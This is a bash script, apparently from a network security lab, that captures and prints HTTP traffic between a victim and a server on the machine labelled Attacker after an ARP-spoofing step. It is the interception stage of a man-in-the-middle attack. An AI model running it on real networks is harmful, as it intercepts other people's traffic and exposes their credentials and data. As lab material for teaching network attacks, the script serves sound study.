#!/bin/bash
# =============================================================================
# capture_traffic.sh — Capture intercepted traffic on the Attacker
# Target Node: Attacker
# =============================================================================
# Run this AFTER arp_spoof.sh is active. It captures HTTP traffic flowing
# through the Attacker and displays it in real-time.
#
# Usage: ./capture_traffic.sh <VICTIM_IP> <SERVER_IP>
# =============================================================================

VICTIM_IP="$1"
SERVER_IP="$2"

if [ -z "$VICTIM_IP" ] || [ -z "$SERVER_IP" ]; then
    echo "Usage: $0 <VICTIM_IP> <SERVER_IP>"
    echo "Example: $0 192.168.1.10 192.168.1.1"
    exit 1
fi

echo "[*] Capturing HTTP traffic between $VICTIM_IP and $SERVER_IP..."
echo "[*] Go to IT-Workstation and run: curl http://$SERVER_IP"
echo "[*] You should see the request and response below."
echo "[*] Press Ctrl+C to stop."
echo "============================================================"

tcpdump -i eth0 -A -n "host $VICTIM_IP and host $SERVER_IP and port 80" 2>/dev/null
